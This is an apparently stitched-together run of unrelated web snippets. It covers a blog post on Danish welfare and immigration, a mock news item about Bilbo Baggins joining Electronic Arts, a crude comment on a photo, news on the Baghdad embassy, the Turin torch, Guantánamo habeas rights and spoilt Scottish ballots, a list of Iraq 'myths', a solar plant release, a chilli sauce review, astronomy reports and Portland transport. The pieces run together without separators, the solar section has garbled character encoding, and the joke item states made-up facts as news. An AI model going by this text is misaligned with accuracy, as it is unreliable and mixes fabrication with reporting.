But immigration is changing this ; it drives a wedge between the two definitions , ultimately undercutting support for the public institutions Danes cherish .
Americans do n't get too worked up at the thought that there are freeloaders on the welfare system . . . but the price of that casual attitude is that no one supports a very generous welfare system .
But , national and genetic solidarity having gone somewhat out of fashion , no one can say " welfare for Danes " .
Immigrants have to be kept out , most of them worse off than they would be in Denmark with no government benefits , so that Danes can preserve the public fiction that they are just as interested in people without Danish blood .
I am under the impression that Mr Cowen also believes that this applies even to heartless America , which cannot let Mexican immigrants in even without benefits , because Americans could not tolerate the enclaves of gross poverty that would rapidly appear near American cities .
Update A reader points me to this article from the Wall street Journal , which indicates that free riding is n't so well controlled by social sanction even in homogenous countries :
Bilbo Baggins Headed For Electronic Arts To Work On Time Travel Posted by brian on Tue September 29 , 03:49 PM
from the have fun hitting reload page dept .
I 'm not sure whether to call it a miracle or a bad decision , but Electronic Arts announced today that Bilbo Baggins is now an employee of theirs .
What position that was offered at Electronic Arts was n't announced , but with Bilbo Baggins 's experience in sinking the Bismarck , I suspect a position in the time travel department will be forthcoming .

It 's soooooo heavily photoshopped or green - screened or something that it 's distracting me from her actual shape .
I can't tell what 's really her , and that makes me sad because I want to perv over her body . :/

One building that 's been built on time and on budget in Iraq : America 's fortress embassy
When the idea of building a new US embassy in Baghdad was first mooted by the American administration in the aftermath of the invasion of Iraq , there seemed to be a grandiose logic to it .
The compound , by the side of the Tigris , would be a statement of President Bush 's intent to expand democracy through the Middle East .
Yesterday , however , the entire project was under fresh scrutiny as new details emerged of its cost and scale .
Rising from the dust of the city 's Green Zone it is destined , at $ 592 m ( £ 300 m ) , to become the biggest and most expensive US embassy on earth when it opens in September .
It will cover 104 acres ( 42 hectares ) of land , about the size of the Vatican .
It will include 27 separate buildings and house about 615 people behind bomb - proof walls .
Most of the embassy staff will live in simple , if not quite monastic , accommodation in one - bedroom apartments .
The US ambassador , however , will enjoy a little more elbow room in a high - security home on the compound reported to fill 16,000 square feet ( 1,500 sq metres ) .
His deputy will have to make do with a more modest 9,500 sq ft .
They will have a pool , gym and communal living areas , and the embassy will have its own power and water supplies .
But commentators and Iraq experts believe the project was flawed from its inception , and have raised concerns it will become an enormous , heavily targeted white elephant that will be an even greater liability if and when the Americans scale back their presence in Iraq .
" What you have is a situation in which they are building an embassy without really thinking about what its functions are , " Edward Peck , a former American diplomat in Iraq , told AP .
" What kind of embassy is it when everybody lives inside and it's blast - proof , and people are running around with helmets and crouching behind sandbags ? "
Since the overthrow of Saddam Hussein in 2003 about 1,000 US diplomatic and military staff have been using one of his former palaces as a make - shift embassy , which several observers have criticised as giving the regrettable impression that the Americans merely replaced Saddam 's authoritarian rule with their own .
Joost Hildermann , an Iraq analyst with the International Crisis Group , said of the new embassy : " This sends a really poor signal to Iraqis that the Americans are building such a huge compound in Baghdad .
It does very little to assuage Iraqis who are angry that America is running the country , and not very well at that . "
The need to make the compound secure is a top priority .
The Green Zone - the fortified four square miles in which the Iraqi and American governments and other international officials operate - used to be relatively peaceful but in recent months has come under almost daily rocket and mortar fire .
This month the US embassy ordered its people to wear flak jackets and helmets at all times when in the open after four foreign contractors were killed by a rocket landing beside the present embassy .
The multiple cranes surrounding the construction site of the new embassy have already attracted attacks from insurgents .
Last week five contractors were wounded in a rocket assault .
Despite the peculiar pressures , the Bush administration says the embassy will open in September , and be fully staffed by the end of the year .
Already , however , there have been suggestions that the compound will not be large enough to house hundreds of diplomats and military personnel likely to remain in Iraq for some time .
Scores of US officials are currently housed in trailers which are vulnerable to bombs landing on their roofs .
According to a report by McClatchy News , staff members have complained about the dangers only to be told they must wait until the new embassy is ready to take them in .
Toby Dodge , an expert on Iraq at Queen Mary , University of London , has just come back from a month spent in Iraq , largely in the Green Zone .
He thinks the Americans are unlikely to pull out of Iraq fully until the end of the next presidency at the earliest , and so the new embassy will serve its purpose for several years to come .
" A fortress - style embassy , with a huge staff , will remain in Baghdad until helicopters come to airlift the last man and woman from the roof , " he said , adding his own advice to the architects of the building : " Include a large roof . "
There is one added irony - the embassy is one of the few major projects the administration has undertaken in Iraq that is on schedule and within budget .
Hailed as a masterpiece of design and technology and created by Italy 's top engineers , there 's just one problem with the torch for this year 's Winter Olympics in Turin .
Many of the torchbearers say it is too heavy .
At nearly 2 kilos ( 4.4lb ) , runners carrying the aluminium torch in relay across Italy to the opening ceremony say it is difficult to hold aloft for long .
' Running with it is quite tough , ' said Greek pole vault champion Kostas Filippidis , 19 , one of the first torchbearers .
' I do n't think it 's possible to run even 100 metres with your arm outstretched , and if you bend your arm you risk the flame coming too near your body . '
' The torch is a bit too heavy and you can't run as you would like , ' said Italian former boxing champion Nino Benvenuti .
' I had to keep changing it from arm to arm in order to hold it up . '
The Olympic flame - brought from Athens to Rome on 7 December - is on a two - month journey across Italy in the torch , which resembles the point of a ski .
Produced by a team at the renowned Pininfarina design factory in Turin , it weighs 1.97 kilos ( 4.3lb ) .
Only two other torches have been heavier - that for the Innsbruck games in 1964 weighed 2.25 kilos ( nearly 5 lb ) and the torch for the London games in 1948 weighed in at 2.15 kilos ( 4.74lb ) .
Francesco Lovo , head of the design team , said the torch had to be ' very robust ' to cope with extremes of weather .
' We were working to specifications given to us by the Winter Olympics Committee , ' he said .
Committee members wanted to avoid problems afflicting the Athens 2004 torch , which weighed 770 grams ( under 2lb ) , and was deemed too fragile .
Lovo denied a report in the Italian newspaper Il Messaggero that the torch was dangerous because runners were forced to hold it too close to their bodies .
' It 's a real flame , not a flashing light , so of course people have to be careful and hold it at a distance , ' he said .
' Everything is a trade - off , but we felt it was important to have a torch that was safe , resistant to weather and strong enough to withstand human error , such as someone dropping it .
There is no protocol about how it 's carried .
You can walk with it , run with it , hold it high or at waist level .
It 's up to the individual runners . '
The flame is a symbol of the Olympics , dating from the games held in Ancient Greece when athletes competed in a relay race using a torch .
The modern custom of runners carrying a torch to the opening ceremony began at the 1936 Berlin Games .

Top Ten Myths about Iraq 2006
1. Myth number one is that the United States “ can still win ” in Iraq .
Of course , the truth of this statement , frequently still made by William Kristol and other Neoconservatives , depends on what “ winning ” means .
But if it means the establishment of a stable , pro-American , anti-Iranian government with an effective and even - handed army and police force in the near or even medium term , then the assertion is frankly ridiculous .
The Iraqi “ government ” is barely functioning .
The parliament was not able to meet in December because it could not attain a quorum .
Many key Iraqi politicians live most of the time in London , and much of parliament is frequently abroad .
Prime Minister Nuri al - Maliki does not control large swathes of the country , and could give few orders that had any chance of being obeyed .
The US military cannot shore up this government , even with an extra division , because the government is divided against itself .
Most of the major parties trying to craft legislation are also linked to militias on the streets who are killing one another .
It is over with .
Iraq is in for years of heavy political violence of a sort that no foreign military force can hope to stop .
The United States cannot “ win ” in the sense defined above .
It cannot .
And the blindly arrogant assumption that it can win is calculated to get more tens of thousands of Iraqis killed and more thousands of American soldiers and Marines badly wounded or killed .
Moreover , since Iraq is coming apart at the seams under the impact of our presence there , there is a real danger that we will radically destabilize it and the whole oil - producing Gulf if we try to stay longer .
2. “ US military sweeps of neighborhoods can drive the guerrillas out . ”
The US put an extra 15,000 men into Baghdad this past summer , aiming to crush the guerrillas and stop the violence in the capital , and the number of attacks actually increased .
This result comes about in part because the guerrillas are not outsiders who come in and then are forced out .
The Sunni Arabs of Ghazaliya and Dora districts in the capital are the “ insurgents . ”
The US military cannot defeat the Sunni Arab guerrilla movement or “ insurgency ” with less than 500,000 troops , based on what we have seen in the Balkans and other such conflict situations .
The US destroyed Falluja , and even it and other cities of al - Anbar province are not now safe !
The US military leaders on the ground have spoken of the desirability of just withdrawing from al - Anbar to Baghdad and giving up on it .
In 2003 , 14 percent of Sunni Arabs thought it legitimate to attack US personnel and facilities .
In August , 2006 , over 70 percent did .
How long before it is 100 % ?
Winning guerrilla wars requires two victories , a military victory over the guerrillas and a winning of the hearts and minds of the general public , thus denying the guerrillas support .
The US has not and is unlikely to be able to repress the guerrillas , and it is losing hearts and minds at an increasing and alarming rate .
They hate us , folks .
They do n’t want us there .
3 . The United States is best off throwing all its support behind the Iraqi Shiites .
This is the position adopted fairly consistently by Marc Reuel Gerecht .
Gerecht is an informed and acute observer whose views I respect even when I disagree with them .
But Washington policy - makers should read Daniel Goleman ’s work on social intelligence .
Goleman points out that a good manager of a team in a corporation sets up a win / win framework for every member of the team .
If you set it up on a win / lose basis , so that some are actively punished and others “ triumph , ” you are asking for trouble .
Conflict is natural .
How you manage conflict is what matters .
If you listen to employees ’ grievances and try to figure out how they can be resolved in such a way that everyone benefits , then you are a good manager .
Gerecht , it seems to me , sets up a win / lose model in Iraq .
The Shiites and Kurds win it all , and the Sunni Arabs get screwed over .
Practically speaking , the Bush policy has been Gerechtian , which in my view has caused all the problems .
We should n’t have thought of our goal as installing the Shiites in power .
Of course , Bush hoped that those so installed would be “ secular , ” and that is what Wolfowitz and Chalabi had promised him .
Gerecht came up with the ex post facto justification that even the religious Shiites are moving toward democracy via Sistani .
But democracy cannot be about one sectarian identity prevailing over , and marginalizing others .
The Sunni Arabs have demonstrated conclusively that they can act effectively as spoilers in the new Iraq .
If they are n’t happy , no one is going to be .
The US must negotiate with the guerrilla leaders and find a win / win framework for them to come in from the cold and work alongside the Kurds and the religious Shiites .
About this , US Ambassador in Baghdad Zalmay Khalilzad has been absolutely right .
4 . “ Iraq is not in a civil war , ” as Jurassic conservative Fox commentator Bill O’Reilly insists .
There is a well - established social science definition of civil war put forward by Professor J. David Singer and his colleagues : “ Sustained military combat , primarily internal , resulting in at least 1,000 battle - deaths per year , pitting central government forces against an insurgent force capable of effective resistance , determined by the latter ’s ability to inflict upon the government forces at least 5 percent of the fatalities that the insurgents sustain . ” ( Errol A. Henderson and J. David Singer , “ Civil War in the Post - Colonial World , 1946 - 92 , ” Journal of Peace Research , Vol. 37 , No. 3 , May 2000 . ) ”
See my article on this in Salon.com .
By Singer ’s definition , Iraq has been in civil war since the Iraqi government was reestablished in summer of 2004 .
When I have been around political scientists , as at the ISA conference , I have found that scholars in that field tend to accept Singer ’s definition .
5 . “ The second Lancet study showing 600,000 excess deaths from political and criminal violence since the US invasion is somehow flawed . ”
Les Roberts replies here to many of the objections that were raised .
See also the transcript of the Kucinich - Paul Congressional hearings on the subject .
Many critics refer to the numbers of dead reported in the press as counter - arguments to Roberts et al .
But “ passive reporting ” such as news articles never captures more than a fraction of the casualties in any war .
I see deaths reported in the Arabic press all the time that never show up in the English language wire services .
And , a lot of towns in Iraq do n’t have local newspapers and many local deaths are not reported in the national newspapers .
6 . “ Most deaths in Iraq are from bombings . ”
The Lancet study found that the majority of violent deaths are from being shot .
7 . “ Baghdad and environs are especially violent but the death rate is lower in the rest of the country . ”
The Lancet survey found that levels of violence in the rest of the country are similar to that in Baghdad ( remember that the authors included criminal activities such as gang and smuggler turf wars in their statistics ) .
The Shiite south is spared much Sunni - Shiite communal fighting , but criminal gangs , tribal feuds , and militias fight one another over oil and antiquities smuggling , and a lot of people are getting shot down there , too .
8 . “ Iraq is the central front in the war on terror . ”
From the beginning of history until 2003 there had never been a suicide bombing in Iraq .
There was no al - Qaeda in Baath - ruled Iraq .
When Baath intelligence heard that Abu Musab al - Zarqawi might have entered Iraq , they grew alarmed at such an “ al - Qaeda ” presence and put out an APB on him !
Zarqawi ’s so - called “ al - Qaeda in Mesopotamia ” was never “ central ” in Iraq and was never responsible for more than a fraction of the violent attacks .
This assertion is supported by the outcome of a US - Jordanian operation that killed Zarqawi this year .
His death had no impact whatsoever on the level of violence .
There are probably only about 1,000 foreign fighters even in Iraq , and most of them are first - time volunteers , not old - time terrorists .
The 50 major guerrilla cells in Sunni Arab Iraq are mostly made up of Iraqis , and are mainly : 1 ) Baathist or neo-Baathist , 2 ) Sunni revivalist or Salafi , 3 ) tribally - based , or 4 ) based in city quarters .
Al - Qaeda is mainly a boogey man , invoked in Iraq on all sides , but possessing little real power or presence there .
This is not to deny that radical Sunni Arab volunteers come to Iraq to blow things ( and often themselves ) up .
They just are not more than an auxiliary to the big movements , which are Iraqi .
9 . “ The Sunni Arab guerrillas in places like Ramadi will follow the US home to the American mainland and commit terrorism if we leave Iraq . ”
This assertion is just a variation on the invalid domino theory .
People in Ramadi only have one beef with the United States .
Its troops are going through their wives ’ underwear in the course of house searches every day .
They do n’t want the US troops in their town or their homes , dictating to them that they must live under a government of Shiite clerics and Kurdish warlords ( as they think of them ) .
If the US withdrew and let the Iraqis work out a way to live with one another , people in Ramadi will be happy .
They are not going to start taking flight lessons and trying to get visas to the US .
This argument about following us , if it were true , would have prevented us from ever withdrawing from anyplace once we entered a war there .
We ’d be forever stuck in the Philippines for fear that Filipino terrorists would follow us back home .
Or Korea ( we moved 15,000 US troops out of South Korea not so long ago .
Was that unwise ?
Are the thereby liberated Koreans now gunning for us ? )
Or how about the Dominican Republic ?
Haiti ? Grenada ?
France ?
The argument is a crock .
10 . “ Setting a timetable for withdrawal from Iraq is a bad idea . ”
Bush and others in his administration have argued that setting such a timetable would give a significant military advantage to the guerrillas fighting US forces and opposed to the new government .
That assertion makes sense only if there were a prospect that the US could militarily crush the Sunni Arabs .
There is no such prospect .
The guerrilla war is hotter now than at any time since the US invasion .
It is more widely supported by more Sunni Arabs than ever before .
It is producing more violent attacks than ever before .
Since we cannot defeat them short of genocide , we have to negotiate with them .
And their first and most urgent demand is that the US set a timetable for withdrawal before they will consider coming into the new political system .
That is , we should set a timetable in order to turn the Sunni guerrillas from combatants to a political negotiating partner .
Even Sunni politicians cooperating with the US make this demand .
They are disappointed with the lack of movement on the issue .
How long do they remain willing to cooperate ?
In addition , 131 Iraqi members of parliament signed a demand that the US set a timetable for withdrawal .
( 138 would be a simple majority . )
It is a a major demand of the Sadr Movement .
In fact , the 32 Sadrist MPs withdrew from the ruling United Iraqi Alliance coalition temporarily over this issue .
In my view , Shiite leaders such as Abdul Aziz al - Hakim are repeatedly declining to negotiate in good faith with the Sunni Arabs or to take their views seriously .
Al - Hakim knows that if the Sunnis give him any trouble , he can sic the Marines on them .
The US presence is making it harder for Iraqi to compromise with Iraqi , which is counterproductive .
Think Progress points out that in 1999 , Governor George W. Bush criticized then President Clinton for declining to set a withdrawal timetable for Kosovo , saying “ Victory means exit strategy , and it ’s important for the president to explain to us what the exit strategy is . ”

And yet , iPhones sell for $ 600 or more ...

Juwi solar GmbH based in Bolanden ( in the German state Rhineland - Palatinate ) has put the final touches to the â€œRote Jahneâ€ solar power project in the district town of Delitzsch northeast of Leipzig .
Connection to the electricity grid finalized construction of the large - scale photovoltaic ( PV ) project .
With total output capacity of six megawatts , it is the fifth biggest PV installation operating in the world .
It is also the worldâ€™s biggest solar project to use thin - film modules .
The array will produce around 5.7 million kilowatt - hours of solar electricity every year , enough to power some 1,900 homes .
That also displaces the annual emission of 3,750 tons of carbon dioxide ( CO2 ) into the environment .
The PV power plant is built at a former military airfield ; its module surface area comprises approximately 6.7 hectares â€ “ about the same size as 11 soccer fields .
As the general contractor , juwi installed the entire turn - key project .
Investment amounted to around 21 million euros .
The â€ œRote Jahneâ€ PV power plant is based on state - of - the - art thinfilm technology made by First Solar .
â€ œThin -film modules have stood the test in many projects , are cheaper than crystalline modules and produce more energy per unit of installed capacity .
We can clearly see that the skepticism that reigned two years ago has given way to higher demand .
So its part in the overall market will increase distinctly in the future , â€ says Lars Falck , managing director of juwi solar GmbH .
The array consists of more than 90,000 modules .
By why stop at 6 Mw ?
Near the â€œRote Jahneâ€ solar park juwi recently launched construction of the worldâ€™s biggest photovoltaic power plant .
In the Muldentalkreis district the juwi company is installing a 40 - megawatt solar park at a former military airbase in the townships of Brandis and Bennewitz .
More than 550,000 First Solar thin - film modules will be used in an area comparable to 200 soccer fields .
That project is due to be finished by the end of 2009 .
In recent years the proportion of cleanly produced power in the supply has grown constantly in Germany .
Wind , hydro , solar and bio sources now generate about 12 % of the national supply .
The federal governmentâ€™s sustainability strategy aims at a 50 % share of renewables in the middle of the century .
The European Parliament demands a renewables proportion of 35 % in the European supply by 2020 .
In Germany the Renewable Energy Sources Act ( EEG ) is the core instrument for implementing this strategy .
It has developed into an elementary building block for securing and creating jobs .
The German renewable energies sector employs about 170,000 people .
Germany is a leader in the use of solar energy , with 300,000 solar power arrays installed , amounting to a capacity of some 2,300 megawatts ( status end of 2006 ) .
In 2006 PV power production rose 60 % to some two billion kilowatt - hours .
That makes photovoltaics the fastest growing energy source .
Germany is the Number 1 on the solar market .
In just a few years the stable political framework has made the solar industry an important employer in Germany .
Photovoltaics enterprises employ around 50,000 people .
Although the proportion of power produced by PV in the German supply is still small , studies by renowned institutes and enterprises ( including the Shell corporation ) assume that solar power production will become one of the most important future renewables .
After all , the sun radiates more than 15,000 times more energy to earth than is used .
Just 30 to 40 square metres are enough to keep a German household of four people supplied with power for a year .
Solar energy can be deployed flexibly , in a large power station or as the only power source in areas not connected to a grid .
Presently two billion people have no grid access .
That offers a huge potential to enterprises , including German ones which due to promotion by the Renewable Energy Sources Act ( EEG ) have taken a leading position in the global solar market .
Germany is well placed to become the world market leader in the manufacture of photovoltaic products ( modules , assembly systems , etc. ) .
Because of the massive potential , a market is developing which will outstrip the automobile industry by far .
To maintain the impetus it will be necessary to keep the EEG in place in its present form for another ten years or so .

Opponents of the measure denounced the Senate vote as a grave step backward in the nation 's treatment of detainees in the global war on terror .
" This is not a time to back away from the principles that this country was founded on , " Mr. Bingaman said during floor debate .
Senator Arlen Specter of Pennsylvania , chairman of the Judiciary Committee and one of four Republicans to vote against the measure , said the Senate was unduly rushing into a major legal shift without enough debate .
" I believe the habeas corpus provision needs to be maintained , " Mr. Specter said .
A three - judge panel trying to resolve the extent of Guantánamo prisoners ' rights to challenge detentions sharply questioned an administration lawyer in September when he argued that detainees had no right to be heard in federal appeals courts .
The panel of the District of Columbia Circuit is trying to apply a 2004 Supreme Court ruling to two subsequent , conflicting decisions by lower courts , one appealed by the prisoners and the other by the administration .
In its June 28 , 2004 , decision in Rasul v. Bush , the Supreme Court ruled 6 to 3 that the Guantánamo base was not outside the jurisdiction of American law as administration lawyers had argued and that the habeas corpus statute allowing prisoners to challenge their detentions was applicable .
Under Mr. Graham 's measure , Guantánamo prisoners would be able to challenge only the narrow question of whether the government followed procedures established by the defense secretary at the time the military determined their status as enemy combatants , which is subject to an annual review .
The District of Columbia Circuit would retain the right to rule on that , but not on other aspects of a prisoner 's case .
Detainees would not be able to challenge the underlying rationale for their detention .
" If it stands , it means detainees at Guantánamo Bay would have no access to any federal court for anything other than very simple procedural complaints dealing with annual status review , " said Christopher E. Anders , a legislative counsel for the American Civil Liberties Union .
" Otherwise , the federal courts ' door is shut . "
Ive tasted some fantastic hot chilli based pickles , oils and sauces in my time but recently I stumbled across a new range of products sold by a Brighton Food Company - Chillipepperpete .
Im not normally one for writing sauce reviews but after purchasing a number of his sauces , I just had to tell you more about two of them inparticular .
The first ones called ' Nagabih Tarkari ' which claims to be ' the worlds hottest curry sauce ' .
Ive eaten more Naga Morich & Bih Jolokia chillis ( the worlds hottest chillis ) than you can shake a stick at and this is the first Bih Jolokia based sauce I have come across , which is what initially caught my attention .
The ' active ingredient ' is the Bih Jolokia chilli from Assam India with a infusion of tomotoes , carrots , courgettes , peas , pumpkin and even cabbage thrown in for good measure .
With this blend of vegetables I must say I was a bit sceptical but boy was I wrong .
This is one of best sauces
Ive ever taste - it an absolute dream and even gives Katos Island Sauce a run for its money .
Despite being spicy , rather than blow your head off , the intense flavour just overwhelms your taste buds .
I particularly like the seet pumpkin undertones ( mental note : I must use Pumpkins in my next batch of homemade sauce ) .
Add a couple of tablespoons of this sauce to any bland ready meal supermarket curry and even they can be transformed into something special .
The second one is called ' Dragons Blood ' another Bih Jolokia based sauce which almost glows in the bottle .
More runny then Naga Tarkari , you just need to look at its ruby red colour and you know this is a serious bad boy .
My only complaint with this one is that its just too hot !
I dabbed just a pea sized dollop on my finger and I though my tongue was going to explode .
I spent the the next half an hour swilling milk around my mouth whilst tending to my streaming nose .
I think the tame picture of the dragon needs to be replaced with a toxic chemical symbol .
A bottle of this size should last even the most sadasitic chilli head an age .
If you like eating raw Naga Morich or Bih Jolokia pods for a laugh , this sauce is a must !

PS I will not be held responsible for any damage you do to yourself !
Thousands of ballot papers have been rejected , officials said
The polls have been hit by major problems with seven counts suspended and up to 100,000 ballot papers spoilt .
Technical failures , confusion about how to fill in ballot papers and problems with postal votes have all been blamed .
SNP leader Alex Salmond said if he won power he would hold an independent judicial inquiry into the problems .
He insisted it " would go further than the current " investigation by the Electoral Commission .
Mr Salmond added : " The inquiry will have the fullest powers and the most searching remit .
It will be charged with laying bare the outrage of why over 100,000 Scots were denied their democratic voice . "
The Electoral Commission is an independent body which , although it does not run elections , reports on all major elections .
Separately , the Scotland Office said the failures must be investigated by DRS , the company which operates the electronic counting system .
It said that the Scotland Office shared the public 's concern about the high number of rejected ballot papers .

A statement said : " The independent Electoral Commission will undertake a statutory review into the conduct of this election .
" It is important that they look as a matter of urgency into delays in postal ballots , the high number of spoiled ballot papers , and the performance of the electronic counting machines . "
A commission spokeswoman said she could not comment on whether the election would have to be re-run .
She added that it was not up to the organisation to re-play elections , but anyone , including members of the public and candidates , can petition the Royal Courts of Justice to dispute a result .
The prime minister 's official spokesman described the matter as serious and said he shared the public 's concern .
Concerns have been raised about the decision to stage the Scottish Parliament and the local authority elections on the same day .
Voters were presented with two ballot papers and different voting systems .
The Electoral Commission has launched an investigation
The local authority ballot used the new Single Transferable Vote system .
The returning officer at the Glasgow Shettleston count said there had been 2,035 spoilt papers , while in Airdrie and Shotts , Labour 's majority of 1,446 was less than the 1,536 rejected ballots .
There were 1,850 spoilt papers in Glasgow Baillieston and 1,736 in the Anniesland constituency .
The counts in Aberdeen , Argyll and Bute , Edinburgh , Eastwood , Perth and Tayside North and Strathkelvin and Bearsden were suspended until later on Friday due to technical problems .
The problem at the Strathkelvin and Bearsden count occurred when the computer system could not validate the votes that had been counted so far .
BBC Scotland political editor Brian Taylor described the situation as a disgrace .
Sonya Anderson , head of elections for DRS which implemented the automated counting system , said there was a problem with the " consolidation " of the votes .
She said : " As we scan the ballot papers we are capturing the votes and recording the fact we are capturing those votes .
" Once we have recorded all those votes we need to use a calculation to pull those results together and produce the results the returning officer is going to declare from .
' Totally inadequate '
" That process is taking longer than anticipated in some of the centres and some returning officers have decided because of the long wait that the staff and the candidates are experiencing that they are going to ask staff and candidates to go home while we resolve the issue . "
During his acceptance speech as the new MSP for the Gordon constituency , SNP leader Alex Salmond criticised the voting arrangements and also earlier problems with postal voting .
He said : " The postal voting arrangements for this election across Scotland were totally inadequate .
" It is also the case that the decision to conduct an STV election at the same time as a first - past - the - post ballot for the Scottish Parliament was deeply mistaken .
" As a direct result , tens of thousands of votes across Scotland have been discounted .
That is totally unacceptable in a democratic society . "
David Henderson , who worked as an information officer at Thornwood Primary School in the Glasgow Kelvin constituency , said he had " no doubt " that the decision to hold two elections , under different voting systems , on the same day , had led to the high number of spoilt votes .
In a response to Brian Taylor 's blog , he wrote : " I would say 60 % of people coming into our polling station were unsure of how to vote .
" I 'm sure the electoral commission will find that spoilt ballots were due to either to ' x 's ' or ' 1's ' and ' 2's ' on the wrong ballot paper . "
Alex Donnelly , a voter in the Airdrie and Shotts constituency , said many voters had been told to fold their ballot papers despite national advice to the contrary .
Supernovae stand out in the sky like cosmic lighthouses .
Scientists at the Max Planck Institute for Astrophysics and at the National Astronomical Institute of Italy have now found a way to use these cosmic beacons to measure distances in space more accurately .
The researchers have been able to show that all supernovae of a certain type explode with the same mass and the same energy - the brightness depends only on how much nickel the supernova contains .
This knowledge has allowed the researchers to calibrate the brightness of supernovae with greater precision .
This means that in the future , they will use the brightness of a supernova that they are observing through their telescopes to determine more accurately how far away from the Earth the cosmic lighthouse is emitting its rays ( Science , 9 February 2007 ) .
The end of a star ’s life , when the star has become heavy enough , is marked by a huge explosion - a supernova .
For a few weeks , a supernova looks almost as bright as a whole galaxy containing billions of stars .
Physicists designate the brightest of these supernovae as Type Ia .
Their brightness , measured from the Earth , is a measure of their distance from us - but there are several uncertainties .
" The question still remains : how suitable are supernovae really for measuring distance ?
For example , the knowledge that the Universe is expanding rapidly is largely based on observations of supernovae , " explains Prof. Wolfgang Hillebrandt .
All type Ia supernovae exhibit similar levels of brightness , but they are not exactly consistent .
Scientists from the Max Planck Institute for Astrophysics and the National Astronomical Institute of Italy have now made a breakthrough .
They have come to the conclusion that the explosion energy of the type Ia supernovae is almost consistent - it is equivalent to the fusion energy which a white dwarf with around one and half times the mass of the Sun can develop .
However , the amount of radioactive nickel and medium - weight chemical elements such as silicon vary from supernova to supernova and explain the difference in their brightness .
The more nickel a supernova contains , the brighter it shines .
In the explosion , nuclear fusion of carbon and oxygen creates large quantities of radioactive atomic nuclei ; in some supernovae , this is mainly the radioactive isotope 56 of the element nickel .
The energy from its radioactive decay is converted to light in the supernova .
The fusion therefore supplies both the energy and the light for the explosion .
The nuclear fusion , however , can end with lighter atomic nuclei like silicon , for example .
This creates the same amount of energy , but the supernova is not so bright .
The researchers identify this situation when they also see the silicon in the light spectrum of the supernova .
Over the last four years , in a study forming part of a European joint venture lead by the Max Planck Institute for Astrophysics , scientists have looked at 20 Ia supernova explosions , following each one for several weeks .
Using spectroscopic and photometric data and complicated numerical simulations , they arrived at results that now make it possible to refine existing calibration methods .
Astronomers calibrate the differences in brightness of the supernovae with their light curves ; that is , the way the brightness develops over time in newly discovered supernovae .
The light curves of brighter supernovae diminish more slowly than those of less bright supernovae .
Up to now , the weakest link in this calibration method has been limited knowledge about the supernova explosions themselves : what causes the differences in brightness and are the corrections made to them justified ?
The supernovae that play a part in cosmology in measuring distances exploded just as our solar system was coming into existence , or even earlier .
Consequently , there is no guarantee that these are the same explosions as those for which the light curves have been calibrated .
In order to exclude possible systematic differences , scientists need to have a very good understanding of the explosions , and the scientists from the Max Planck Institute for Astrophysics and the National Astronomical Institute of Italy have now made a large contribution to this .
" Our surprising results have for the first time delivered a solid basis on which we can use supernovae to measure distances in space , " says Wolfgang Hillebrandt .
" We now understand the differences in the brightness of supernovae better and can calibrate this cosmic yardstick accurately in the future . "
These findings will also benefit cosmologists who use the brightness of supernovae to deduce dark energy .
Scientists believe that it is this dark matter that is responsible for the rapid expansion of the Universe .

Dwarf stars are known to astronomers for some time now , but never has an association of two dwarfs been of such great interest for the scientific community .
A white dwarf is an astronomical object which is produced when a star of low or medium mass dies .
These stars are not massive enough to generate the core temperatures required to continue nuclear fusion reactions in the cold space .
Ultra-cool dwarfs , or brown dwarfs are sub -stellar objects with a mass below that necessary to maintain hydrogen - burning nuclear fusion reactions in their cores , as do stars on the main sequence , but which have fully convective surfaces and interiors , with no chemical differentiation by depth .
Brown dwarfs occupy the mass range between that of large gas giant planets and the lowest mass stars ( anywhere between 75 and 80 Jupiter masses ) .
British scientists from the University of Hertfordshire have discovered a rare co-orbiting pair of stars , made up of a white dwarf , and an ultra-cool dwarf , that has the widest separation ever detected in this type of binary system .
Avril Day - Jones , who presented the discovery at the RAS National Astronomy Meeting in Preston , said : " This is a record breaking discovery for a system of this kind . "
" In the other few binary cases that are known , the objects are relatively close together .
In this new system , the objects are 600 billion kilometers apart which is hundreds of times wider . "
The team believes that the two objects formed at roughly the same time and were originally much closer together .
Elusive ultra-cool dwarfs during the death - throes of the white dwarf 's progenitor star , forces induced when gas and dust from the star were thrown off into space caused the ultra -cool dwarf spiral out to its remote position .
Miss Day - Jones added : " Ultra - cool dwarfs are elusive objects and we do n't know that much about them .
" This type of binary allows us to use our knowledge of white dwarfs , which we understand quite well , to infer properties of the ultra -cool dwarf , such as the temperature , surface gravity , mass and age .
We need to discover more of this type of binary system if we want to improve our understanding of ultra-cool dwarfs . "

Light rail is an integrated part of the city 's transport system
In Oregon they were ' cross dressing ' as far back as the 1970's when the Republican Governor , Tom McCall , took radical steps to prioritise public transport over roads , using the freeways levy to invest in the foundations of what is undoubtedly one of the most integrated and dynamic public transport provisions anywhere in the world .
Today , the city still invests its share of federal tax dollars into multiple modes of transport , and its long - term vision has paid off .
Over the last 10 years , public transport use has gone up by 65 % and they have managed to avoid a predicted 40 % increase in congestion .
And , incredibly for a city in the world 's most car dependent nation , they 're eradicating over 62 million car trips a year , which means car use is growing at the slowest rate anywhere in the United States .
Challenge
A challenge set by the Department of Transportation and Flexcar , a car - sharing business , [ aims ] to show just how easy and economical it is to use public transport
The fall and rise of public services Keeping Cuba healthy
They 're taking part in a challenge set by the Department of Transportation and Flexcar , a car - sharing business , to show just how easy and economical it is to use public transport .
Sarah , Jonathan and their two children have found using a mixture of Portland 's integrated light rail , bus , streetcar , cycle lanes and free city centre transport far easier than they thought .
In fact they 're now going to sell their SUV .

It is exactly the type of responsible governance that Britain needs .
Car junkies
In Portland , using public transport comes as second nature .
Arriving at the airport it did n't cross my mind to use anything other than a taxi ; at the end of the week Max light rail was the only natural choice .
Car junkies like me are becoming endangered species in this city .
But Portland is n't just about successfully getting people out of their cars .
What 's really clear , is the extent to which transport is the absolute bedrock of community development .
The city is an international pioneer in transit orientated developments , high - density , residential and business units around light - rail stops and transit centres .
Portland 's Transportation Commissioner , Sam Adams , puts the city 's success down to 3 main factors : the marriage of transportation and land use issues , public and private partnership , and clear results .
Portland cyclists enjoy dedicated lanes - right out to the airport
Moreover , by enabling and empowering local communities to have a voice through the city 's 150 local government funded community and business associations , they 've got everyone pulling in the same direction .
Cycle lanes
It 's great to see public and private sector working hand in hand delivering the best public transport for its community .
Sitting on the light rail on my way to the airport I notice a cycle lane running beside me - all the way to the terminal .
Cycling traffic has increased by 257 % in the city over the last ten years and members of the cycling community I spoke to told me they feel they have a lot of support from local government in making the city even more bike friendly .
Portland really is an example of true direct democracy in action .
Sayeeda Warsi's film on public transport in Portland , Oregon will be show on Newsnight on BBC Two in the UK and on the Newsnight website at 2130 GMT / 2230BST on Tuesday 15 August .
